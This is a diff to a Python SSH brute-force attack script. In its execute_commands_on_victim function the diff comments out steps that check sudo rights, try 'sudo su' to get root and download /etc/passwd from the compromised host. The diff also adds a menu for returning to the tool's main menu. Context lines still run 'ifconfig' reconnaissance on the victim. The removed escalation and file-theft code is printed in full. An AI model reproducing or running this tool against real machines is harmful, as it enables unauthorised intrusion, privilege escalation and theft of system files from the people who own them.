@@ -30,21 +30,21 @@ def execute_commands_on_victim(ssh_connection):
         network_info = ssh_connection['ifconfig']
         print(f"Network Info:\n{network_info.decode()}")
 
-        print("\n[+] Attempting to gain root access...")
-        sudo_check = ssh_connection['sudo -l']
-        print(f"Sudo Permissions:\n{sudo_check.decode()}")
-        if 'not allowed' not in sudo_check.decode().lower():
-            try:
-                su_attempt = ssh_connection['sudo su']
-                print(f"Attempt to switch to root:\n{su_attempt.decode()}")
-            except Exception as e:
-                print(f"[!] Failed to escalate privileges: {e}")
-        else:
-            print("[!] No sudo privileges available.")
+        #print("\n[+] Attempting to gain root access...")
+        #sudo_check = ssh_connection['sudo -l']
+        #print(f"Sudo Permissions:\n{sudo_check.decode()}")
+        #if 'not allowed' not in sudo_check.decode().lower():
+        #     try:
+        #        su_attempt = ssh_connection['sudo su']
+        #        print(f"Attempt to switch to root:\n{su_attempt.decode()}")
+        #    except Exception as e:
+        #        print(f"[!] Failed to escalate privileges: {e}")
+        #else:
+         #   print("[!] No sudo privileges available.")
 
-        print("\n[+] Attempting to copy sensitive files...")
-        ssh_connection.download('/etc/passwd', '/home/youruser/passwd_copy')
-        print("[+] /etc/passwd copied to '/home/youruser/passwd_copy'")
+        #print("\n[+] Attempting to copy sensitive files...")
+        #ssh_connection.download('/etc/passwd', '/home/youruser/passwd_copy')
+        #print("[+] /etc/passwd copied to '/home/youruser/passwd_copy'")
 
     except Exception as e:
         print(f"[!] An error occurred during command execution: {e}")
@@ -85,6 +85,18 @@ def main():
 
     print("Custom Brute Force Attack Completed.")
     time.sleep(2)  # Adding delay to observe the output
+    end_or_return()  # Call the function to ask the user what to do next
+
+def end_or_return():
+    choice = input("\n[1] Return to Main Menu\n[0] Exit\nSelect an option: ")
+    if choice == '1':
+        from main import main_menu  # Import the main_menu function from main.py
+        main_menu()
+    elif choice == '0':
+        sys.exit()
+    else:
+        print("[!] Invalid selection.")
+        end_or_return()
 
 if __name__ == "__main__":
     main()
